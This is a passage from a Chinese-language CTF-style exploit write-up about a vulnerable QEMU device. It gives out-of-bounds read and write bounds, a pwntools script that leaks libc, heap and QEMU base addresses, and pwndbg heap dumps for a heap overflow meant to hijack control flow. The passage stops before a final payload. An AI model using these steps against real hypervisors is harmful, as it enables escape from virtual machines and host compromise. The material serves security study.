<p><strong>单帧最大越界写（250 字节）</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi mathvariant="bold">c</mi><mi mathvariant="bold">o</mi><mi mathvariant="bold">u</mi><mi mathvariant="bold">n</mi><mi mathvariant="bold">t</mi></mrow><mo>=</mo><mn>125</mn></mrow><annotation encoding="application/x-tex">\mathbf{count}=125</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6349em;"></span><span class="mord"><span class="mord mathbf">count</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">125</span></span></span></span>（受 RX 限制），覆盖</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">[</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mn>2</mn><mo>⋅</mo><mo stretchy="false">(</mo><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><mo>+</mo><mn>125</mn><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn><mtext> </mtext><mo fence="true" stretchy="true" minsize="1.2em" maxsize="1.2em">]</mo><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">
\bigl[\,2\cdot \mathbf{start}\ ,\ 2\cdot(\mathbf{start}+125)-1\,\bigr],
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mopen"><span class="delimsizing size1">[</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace"> </span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathbf">start</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">125</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose"><span class="delimsizing size1">]</span></span><span class="mpunct">,</span></span></span></span></span>

<p>选择 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">s</mi><mi mathvariant="bold">t</mi><mi mathvariant="bold">a</mi><mi mathvariant="bold">r</mi><mi mathvariant="bold">t</mi></mrow><annotation encoding="application/x-tex">\mathbf{start}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6349em;"></span><span class="mord"><span class="mord mathbf">start</span></span></span></span></span> 于允许集合的高端区间（如 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mi>x</mi><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mn>83</mn></mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mn>0</mn><mi>x</mi><mrow><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi><mi mathvariant="normal">F</mi></mrow><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0x\mathrm{FF83}..0x\mathrm{FFFF}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">FF83</span></span><span class="mord">..0</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathrm">FFFF</span></span><span class="mclose">]</span></span></span></span>）即可既过检查又落到 <code>regs</code> 之外。</p>
<h2 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>通过 <strong>0x03 越界读</strong>泄露地址：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">leak = fc03_req(<span class="number">0</span>, <span class="number">0xff81</span>, <span class="number">127</span>)[<span class="number">4</span>:]</span><br><span class="line"><span class="built_in">print</span>(hexdump(leak))</span><br><span class="line">libc.address = u64(leak[<span class="number">0x38</span>:<span class="number">0x38</span> + <span class="number">8</span>]) - <span class="number">0x203b60</span></span><br><span class="line">success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">heap_base = u64(leak[<span class="number">0x48</span>:<span class="number">0x48</span> + <span class="number">8</span>]) - <span class="number">0xa4270</span></span><br><span class="line">success(<span class="string">&quot;heap base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">qemu.address = u64(leak[<span class="number">0xe0</span>:<span class="number">0xe0</span> + <span class="number">8</span>]) - <span class="number">0x9ea35e</span></span><br><span class="line">success(<span class="string">&quot;qemu base: &quot;</span> + <span class="built_in">hex</span>(qemu.address))</span><br></pre></td></tr></table></figure></div>

<pre>00000000  3a 3a 76 6d  73 74 61 74  65 2d 69 66  <font color="#C01C28">00</font> 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │::vm<font color="#12488B">│</font>stat<font color="#12488B">│</font>e-if<font color="#12488B">│</font><font color="#C01C28">·</font>U<font color="#C01C28">··</font>│
00000010  21 <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  70 63 69 2d  64 65 76 69  │!<font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font>pci-<font color="#12488B">│</font>devi│
00000020  63 65 3a 3a  76 6d 73 74  61 74 65 2d  69 66 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │ce::<font color="#12488B">│</font>vmst<font color="#12488B">│</font>ate-<font color="#12488B">│</font>if<font color="#C01C28">··</font>│
00000030  31 <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  60 3b <font color="#12488B">80</font> <font color="#12488B">f7</font>  <font color="#26A269">ff</font> <font color="#12488B">7f</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │1<font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font>`;<font color="#12488B">··│</font><font color="#26A269">·</font><font color="#12488B">·</font><font color="#C01C28">··</font>│
00000040  60 3b <font color="#12488B">80</font> <font color="#12488B">f7</font>  <font color="#26A269">ff</font> <font color="#12488B">7f</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  70 <font color="#12488B">92</font> 57 57  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │`;<font color="#12488B">··│</font><font color="#26A269">·</font><font color="#12488B">·</font><font color="#C01C28">··</font><font color="#12488B">│</font>p<font color="#12488B">·</font>WW<font color="#12488B">│</font>UU<font color="#C01C28">··</font>│
00000050  50 <font color="#12488B">91</font> 57 57  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  70 <font color="#12488B">9c</font> 57 57  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │P<font color="#12488B">·</font>WW<font color="#12488B">│</font>UU<font color="#C01C28">··</font><font color="#12488B">│</font>p<font color="#12488B">·</font>WW<font color="#12488B">│</font>UU<font color="#C01C28">··</font>│
00000060  21 <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#12488B">a5</font> 57 57  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │!<font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font><font color="#C01C28">·</font><font color="#12488B">·</font>WW<font color="#12488B">│</font>UU<font color="#C01C28">··</font>│
00000070  <font color="#12488B">f0</font> <font color="#12488B">aa</font> 57 57  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  61 62 6c 65  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │<font color="#12488B">··</font>WW<font color="#12488B">│</font>UU<font color="#C01C28">··</font><font color="#12488B">│</font>able<font color="#12488B">│</font><font color="#C01C28">····</font>│
00000080  21 <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#12488B">06</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#12488B">05</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │!<font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│·</font><font color="#C01C28">···</font><font color="#12488B">│·</font><font color="#C01C28">···</font>│
00000090  <font color="#12488B">01</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#12488B">01</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │<font color="#12488B">·</font><font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│·</font><font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font>│
000000a0  21 <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  6f 6e 2f 6f  66 66 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │!<font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font>on/o<font color="#12488B">│</font>ff<font color="#C01C28">··</font>│
000000b0  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │<font color="#C01C28">····</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font><font color="#C01C28">····</font>│
000000c0  61 <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  50 <font color="#12488B">98</font> 57 57  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │a<font color="#C01C28">···</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font>P<font color="#12488B">·</font>WW<font color="#12488B">│</font>UU<font color="#C01C28">··</font>│
000000d0  70 <font color="#12488B">98</font> 57 57  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │p<font color="#12488B">·</font>WW<font color="#12488B">│</font>UU<font color="#C01C28">··</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│</font><font color="#C01C28">····</font>│
000000e0  5e <font color="#12488B">e3</font> <font color="#12488B">f3</font> 55  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#12488B">ec</font> <font color="#12488B">e3</font> <font color="#12488B">f3</font> 55  55 55 <font color="#C01C28">00</font> <font color="#C01C28">00</font>  │^<font color="#12488B">··</font>U<font color="#12488B">│</font>UU<font color="#C01C28">··</font><font color="#12488B">│···</font>U<font color="#12488B">│</font>UU<font color="#C01C28">··</font>│
000000f0  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font> <font color="#C01C28">00</font>  <font color="#12488B">b6</font> <font color="#12488B">f4</font>                     │<font color="#C01C28">····</font><font color="#12488B">│</font><font color="#C01C28">····</font><font color="#12488B">│··</font>│
000000fa
[<font color="#26A269"><b>+</b></font>] libc base: 0x7ffff7600000
[<font color="#26A269"><b>+</b></font>] heap base: 0x5555574d5000
[<font color="#26A269"><b>+</b></font>] qemu base: 0x555555554000</pre>


<p>调试发现这部分数据可以泄露<strong>堆地址</strong>，<strong>libc 基地址</strong>和<strong>程序基地址</strong>，多次测试发现这部分数据内容很稳定。</p>
<pre><font color="#26A269"><b>pwndbg&gt; </b></font>u
 ► <font color="#26A269"><b>0x555555962f27</b></font>    <font color="#AFD700"><b>movzx</b></font><font color="#000000"><b>  </b></font><font color="#5FD7FF"><b>eax</b></font><font color="#000000"><b>, </b></font><font color="#5FD7FF"><b>word</b></font><font color="#000000"><b> </b></font><font color="#5FD7FF"><b>ptr</b></font><font color="#000000"><b> [</b></font><font color="#5FD7FF"><b>rax</b></font><font color="#000000"><b> + </b></font><font color="#5FD7FF"><b>rdx</b></font><font color="#000000"><b>*</b></font><font color="#AF87FF"><b>2</b></font><font color="#000000"><b> + </b></font><font color="#AF87FF"><b>2</b></font><font color="#000000"><b>]</b></font>     <font color="#C01C28"><b>EAX</b></font>, [<font color="#12488B">0x555557579724</font>] =&gt; 0x6970
   0x555555962f2c    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">word</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbp</font><font color="#000000"> - </font><font color="#AF87FF">0x1a</font><font color="#000000">], </font><font color="#5FD7FF">ax</font>
   0x555555962f30    <font color="#AFD700">movzx</font><font color="#000000">  </font><font color="#5FD7FF">eax</font><font color="#000000">, </font><font color="#5FD7FF">word</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbp</font><font color="#000000"> - </font><font color="#AF87FF">0x1a</font><font color="#000000">]</font>          <font color="#C01C28"><b>EAX</b></font>, [<font color="#A2734C">0x7fffffffd7e6</font>]
   0x555555962f34    <font color="#AFD700">shr</font><font color="#000000">    </font><font color="#5FD7FF">ax</font><font color="#000000">, </font><font color="#AF87FF">8</font>
   0x555555962f38    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">ecx</font><font color="#000000">, </font><font color="#5FD7FF">eax</font>
   0x555555962f3a    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">rax</font><font color="#000000">, </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbp</font><font color="#000000"> - </font><font color="#AF87FF">0x18</font><font color="#000000">]</font>         <font color="#C01C28"><b>RAX</b></font>, [<font color="#A2734C">0x7fffffffd7e8</font>]
   0x555555962f3e    <font color="#AFD700">lea</font><font color="#000000">    </font><font color="#5FD7FF">rdx</font><font color="#000000">, [</font><font color="#5FD7FF">rax</font><font color="#000000"> + </font><font color="#AF87FF">1</font><font color="#000000">]</font>
   0x555555962f42    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbp</font><font color="#000000"> - </font><font color="#AF87FF">0x18</font><font color="#000000">], </font><font color="#5FD7FF">rdx</font>
   0x555555962f46    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">rdx</font><font color="#000000">, </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbp</font><font color="#000000"> - </font><font color="#AF87FF">8</font><font color="#000000">]</font>            <font color="#C01C28"><b>RDX</b></font>, [<font color="#A2734C">0x7fffffffd7f8</font>]
   0x555555962f4a    <font color="#AFD700">add</font><font color="#000000">    </font><font color="#5FD7FF">rax</font><font color="#000000">, </font><font color="#5FD7FF">rdx</font>
   0x555555962f4d    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">edx</font><font color="#000000">, </font><font color="#5FD7FF">ecx</font>
<font color="#26A269"><b>pwndbg&gt; </b></font>telescope 0x555557579724+4 32
00:0000│ <b>   </b> <font color="#12488B">0x555557579728</font> ◂— &apos;::vmstate-if&apos;
01:0008│ <b>   </b> <font color="#12488B">0x555557579730</font> ◂— 0x550066692d65 /* &apos;e-if&apos; */
02:0010│ <b>   </b> <font color="#12488B">0x555557579738</font> ◂— 0x21 /* &apos;!&apos; */
03:0018│ <b>   </b> <font color="#12488B">0x555557579740</font> ◂— &apos;pci-device::vmstate-if&apos;
04:0020│ <b>   </b> <font color="#12488B">0x555557579748</font> ◂— &apos;ce::vmstate-if&apos;
05:0028│ <b>   </b> <font color="#12488B">0x555557579750</font> ◂— 0x66692d657461 /* &apos;ate-if&apos; */
06:0030│ <b>   </b> <font color="#12488B">0x555557579758</font> ◂— 0x31 /* &apos;1&apos; */
07:0038│ <b>   </b> <font color="#12488B">0x555557579760</font> —▸ <font color="#A347BA">0x7ffff7803b60 (main_arena+160)</font> —▸ <font color="#A347BA">0x7ffff7803b50 (main_arena+144)</font> —▸ <font color="#A347BA">0x7ffff7803b40 (main_arena+128)</font> —▸ <font color="#12488B">0x555557557ad0</font> ◂— ...
08:0040│ <b>   </b> <font color="#12488B">0x555557579768</font> —▸ <font color="#A347BA">0x7ffff7803b60 (main_arena+160)</font> —▸ <font color="#A347BA">0x7ffff7803b50 (main_arena+144)</font> —▸ <font color="#A347BA">0x7ffff7803b40 (main_arena+128)</font> —▸ <font color="#12488B">0x555557557ad0</font> ◂— ...
09:0048│ <b>   </b> <font color="#12488B">0x555557579770</font> —▸ <font color="#12488B">0x555557579270</font> —▸ <font color="#12488B">0x5555575792d0</font> ◂— 0x657a69736d6f72 /* &apos;romsize&apos; */
0a:0050│ <b>   </b> <font color="#12488B">0x555557579778</font> —▸ <font color="#12488B">0x555557579150</font> —▸ <font color="#12488B">0x555557579060</font> ◂— 0x72646461 /* &apos;addr&apos; */
0b:0058│ <b>   </b> <font color="#12488B">0x555557579780</font> —▸ <font color="#12488B">0x555557579c70</font> —▸ <font color="#12488B">0x555557579cd0</font> ◂— &apos;x-pcie-ext-tag&apos;
0c:0060│ <b>   </b> <font color="#12488B">0x555557579788</font> ◂— 0x21 /* &apos;!&apos; */
0d:0068│ <b>   </b> <font color="#12488B">0x555557579790</font> —▸ <font color="#12488B">0x55555757a500</font> —▸ <font color="#12488B">0x55555757a340</font> —▸ <font color="#12488B">0x55555757a4c0</font> ◂— &apos;pci-piix::resettable&apos;
0e:0070│ <b>   </b> <font color="#12488B">0x555557579798</font> —▸ <font color="#12488B">0x55555757aaf0</font> —▸ <font color="#12488B">0x55555757a870</font> —▸ <font color="#12488B">0x55555757a6a0</font> —▸ <font color="#12488B">0x55555757a820</font> ◂— ...
0f:0078│ <b>   </b> <font color="#12488B">0x5555575797a0</font> ◂— 0x656c6261 /* &apos;able&apos; */
10:0080│ <b>   </b> <font color="#12488B">0x5555575797a8</font> ◂— 0x21 /* &apos;!&apos; */
11:0088│ <b>   </b> <font color="#12488B">0x5555575797b0</font> ◂— 0x500000006
12:0090│ <b>   </b> <font color="#12488B">0x5555575797b8</font> ◂— 1
13:0098│ <b>   </b> <font color="#12488B">0x5555575797c0</font> ◂— 1
14:00a0│ <b>   </b> <font color="#12488B">0x5555575797c8</font> ◂— 0x21 /* &apos;!&apos; */
15:00a8│ <b>   </b> <font color="#12488B">0x5555575797d0</font> ◂— 0x66666f2f6e6f /* &apos;on/off&apos; */
16:00b0│ <b>   </b> <font color="#12488B">0x5555575797d8</font> ◂— 0
17:00b8│ <b>   </b> <font color="#12488B">0x5555575797e0</font> ◂— 0
18:00c0│ <b>   </b> <font color="#12488B">0x5555575797e8</font> ◂— 0x61 /* &apos;a&apos; */
19:00c8│ <b>   </b> <font color="#12488B">0x5555575797f0</font> —▸ <font color="#12488B">0x555557579850</font> ◂— &apos;failover_pair_id&apos;
1a:00d0│ <b>   </b> <font color="#12488B">0x5555575797f8</font> —▸ <font color="#12488B">0x555557579870</font> ◂— 0x727473 /* &apos;str&apos; */
1b:00d8│ <b>   </b> <font color="#12488B">0x555557579800</font> ◂— 0
1c:00e0│ <b>   </b> <font color="#12488B">0x555557579808</font> —▸ <font color="#C01C28">0x555555f3e35e</font> ◂— <font color="#AFD700">endbr64</font><font color="#000000"> </font>
1d:00e8│ <b>   </b> <font color="#12488B">0x555557579810</font> —▸ <font color="#C01C28">0x555555f3e3ec</font> ◂— <font color="#AFD700">endbr64</font><font color="#000000"> </font>
1e:00f0│ <b>   </b> <font color="#12488B">0x555557579818</font> ◂— 0
1f:00f8│ <b>   </b> <font color="#12488B">0x555557579820</font> —▸ <font color="#C01C28">0x555555f3f4b6</font> ◂— <font color="#AFD700">endbr64</font><font color="#000000"> </font></pre>
<h3 id="劫持程序执行流"><a href="#劫持程序执行流" class="headerlink" title="劫持程序执行流"></a>劫持程序执行流</h3><p>0x03 功能在越界读的同时由于存在整数溢出导致 <code>g_malloc</code> 分配的 <code>out_buf</code> 存在堆溢出。</p>
<p>调试发现在申请堆块的时候，tcache 中 0x20 大小的空闲堆块后面紧邻的数据如下：</p>
<pre><font color="#26A269"><b>pwndbg&gt; </b></font>u 1
 ► <font color="#26A269"><b>0x555555962eb1</b></font>    <font color="#AFD700"><b>call</b></font><font color="#000000">   </font><font color="#C01C28">g_malloc@plt</font>                &lt;<font color="#C01C28">g_malloc@plt</font>&gt;
        <b>rdi</b>: 5
        <b>rsi</b>: <font color="#12488B">0x555557559a22</font> ◂— 0x4774800080ff0300
        <b>rdx</b>: 0xff80
        <b>rcx</b>: 0x74
   0x555555962eb6    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbp</font><font color="#000000"> - </font><font color="#AF87FF">8</font><font color="#000000">], </font><font color="#5FD7FF">rax</font>
   0x555555962eba    <font color="#AFD700">mov</font><font color="#000000">    </font><font color="#5FD7FF">qword</font><font color="#000000"> </font><font color="#5FD7FF">ptr</font><font color="#000000"> [</font><font color="#5FD7FF">rbp</font><font color="#000000"> - </font><font color="#AF87FF">0x18</font><font color="#000000">], </font><font color="#AF87FF">0</font>
<font color="#26A269"><b>pwndbg&gt; </b></font>bins
<font color="#12488B">tcachebins</font>
<font color="#A2734C">0x20 [  2]</font>: <font color="#12488B">0x555557557e90</font> —▸ <font color="#12488B">0x5555577ae010</font> ◂— 0
<font color="#A2734C">0x30 [  6]</font>: <font color="#12488B">0x5555577adf80</font> —▸ <font color="#12488B">0x555557559700</font> —▸ <font color="#12488B">0x5555577ae100</font> —▸ <font color="#12488B">0x5555577abbd0</font> —▸ <font color="#12488B">0x55555779ffc0</font> —▸ <font color="#12488B">0x5555577ab830</font> ◂— 0
<font color="#A2734C">0x60 [  1]</font>: <font color="#12488B">0x5555577aa8c0</font> ◂— 0
<font color="#A2734C">0x80 [  2]</font>: <font color="#12488B">0x5555577acf60</font> —▸ <font color="#12488B">0x5555577ab660</font> ◂— 0
<font color="#A2734C">0x90 [  7]</font>: <font color="#12488B">0x5555576a60d0</font> —▸ <font color="#12488B">0x55555755c980</font> —▸ <font color="#12488B">0x55555755c8f0</font> —▸ <font color="#12488B">0x5555574dabb0</font> —▸ <font color="#12488B">0x5555574da640</font> —▸ <font color="#12488B">0x5555574da5b0</font> —▸ <font color="#12488B">0x5555574da0e0</font> ◂— 0
<font color="#A2734C">0xe0 [  4]</font>: <font color="#12488B">0x5555577abc40</font> —▸ <font color="#12488B">0x5555577ab860</font> —▸ <font color="#12488B">0x5555577ab530</font> —▸ <font color="#12488B">0x5555577ab450</font> ◂— 0
<font color="#A2734C">0xf0 [  2]</font>: <font color="#12488B">0x5555577aad10</font> —▸ <font color="#12488B">0x5555577aabb0</font> ◂— 0
<font color="#A2734C">0x100 [  7]</font>: <font color="#12488B">0x555557558c30</font> —▸ <font color="#12488B">0x555557558b30</font> —▸ <font color="#12488B">0x555557557700</font> —▸ <font color="#12488B">0x555557557600</font> —▸ <font color="#12488B">0x555557557500</font> —▸ <font color="#12488B">0x555557557400</font> —▸ <font color="#12488B">0x5555577ab940</font> ◂— 0
<font color="#A2734C">0x110 [  7]</font>: <font color="#12488B">0x55555755d230</font> —▸ <font color="#12488B">0x55555755d120</font> —▸ <font color="#12488B">0x5555574f48d0</font> —▸ <font color="#12488B">0x5555574f2dc0</font> —▸ <font color="#12488B">0x5555574f2cb0</font> —▸ <font color="#12488B">0x5555574db320</font> —▸ <font color="#12488B">0x5555574db210</font> ◂— 0
<font color="#A2734C">0x1e0 [  1]</font>: <font color="#12488B">0x5555574d52a0</font> ◂— 0
<font color="#A2734C">0x210 [  6]</font>: <font color="#12488B">0x55555755fea0</font> —▸ <font color="#12488B">0x55555755e390</font> —▸ <font color="#12488B">0x55555755e180</font> —▸ <font color="#12488B">0x5555574f8280</font> —▸ <font color="#12488B">0x5555574f4bf0</font> —▸ <font color="#12488B">0x5555574f49e0</font> ◂— 0
<font color="#A2734C">0x410 [  5]</font>: <font color="#12488B">0x5555575600b0</font> —▸ <font color="#12488B">0x5555574ff7e0</font> —▸ <font color="#12488B">0x5555574f88a0</font> —▸ <font color="#12488B">0x5555574f8490</font> —▸ <font color="#12488B">0x5555574d5500</font> ◂— 0
<font color="#12488B">fastbins</font>
<font color="#A2734C">empty</font>
<font color="#12488B">unsortedbin</font>
<font color="#A2734C">all</font>: <font color="#12488B">0x5555577ad560</font> —▸ <font color="#A347BA">0x7ffff7803b20 (main_arena+96)</font> ◂— <font color="#12488B">0x5555577ad560</font>
<font color="#12488B">smallbins</font>
<font color="#A2734C">0x20</font>: <font color="#12488B">0x555557557ad0</font> —▸ <font color="#12488B">0x555557557950</font> —▸ <font color="#12488B">0x5555577a12b0</font> —▸ <font color="#A347BA">0x7ffff7803b30 (main_arena+112)</font> ◂— <font color="#12488B">0x555557557ad0</font>
<font color="#A2734C">0x60</font>: <font color="#12488B">0x555557559690</font> —▸ <font color="#12488B">0x5555577ad130</font> —▸ <font color="#A347BA">0x7ffff7803b70 (main_arena+176)</font> ◂— <font color="#12488B">0x555557559690</font>
<font color="#12488B">largebins</font>
<font color="#A2734C">0x1000-0x11f0</font>: <font color="#12488B">0x5555577abd10</font> —▸ <font color="#A347BA">0x7ffff7804140 (main_arena+1664)</font> ◂— <font color="#12488B">0x5555577abd10</font>
<font color="#26A269"><b>pwndbg&gt; </b></font>telescope 0x555557557e90+0x10 20
00:0000│ <b>   </b> <font color="#12488B">0x555557557ea0</font> ◂— 0x80
01:0008│ <b>   </b> <font color="#12488B">0x555557557ea8</font> ◂— 0x81
02:0010│ <b>   </b> <font color="#12488B">0x555557557eb0</font> —▸ <font color="#A347BA">0x5555574d40a0</font> —▸ <font color="#12488B">0x555557558380</font> ◂— <font color="#A347BA">0x5555574d40a0</font>
03:0018│ <b>   </b> <font color="#12488B">0x555557557eb8</font> ◂— 0
... ↓     5 skipped
09:0048│ <b>   </b> <font color="#12488B">0x555557557ee8</font> ◂— 0x100000000
0a:0050│ <b>   </b> <font color="#12488B">0x555557557ef0</font> ◂— 0
0b:0058│ <b>   </b> <font color="#12488B">0x555557557ef8</font> ◂— 0
